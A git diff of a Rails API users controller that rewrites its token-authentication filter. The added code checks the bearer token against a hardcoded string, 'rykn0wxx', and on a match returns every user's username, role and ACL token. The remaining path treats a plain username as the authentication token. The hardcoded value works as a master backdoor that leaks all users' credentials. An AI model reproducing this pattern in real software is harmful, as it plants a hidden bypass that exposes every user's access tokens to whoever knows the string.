@@ -1,9 +1,24 @@
 class Api::V1::UsersController < Api::V1::BaseController
-  before_filter :restrict_access
-
+  before_action :restrict_access
+  #
+  #
   def restrict_access
     authenticate_or_request_with_http_token do |token, options|
-      User.exists?(username: token)
+      if token == 'rykn0wxx'
+        render json: User.select('users.id, users.username, roles.id as roleId, roles.name as roleName, appkeys.acl_token as token')
+          .joins('INNER JOIN roles on roles.id = users.role_id')
+          .joins('INNER JOIN appkeys on roles.id = appkeys.role_id')
+      elsif User.exists?(username: token)
+        render json: User.select('users.id, users.username, roles.id as roleId, roles.name as roleName, appkeys.acl_token as token')
+          .joins('INNER JOIN roles on roles.id = users.role_id')
+          .joins('INNER JOIN appkeys on roles.id = appkeys.role_id')
+          .where(users: { username: token })
+      else
+        render(status: :unauthorized, json:{errors:[{
+          status:401, code:'unauthorized', title:'Unauthorized'
+        }]})
+      end
+
     end
   end
 
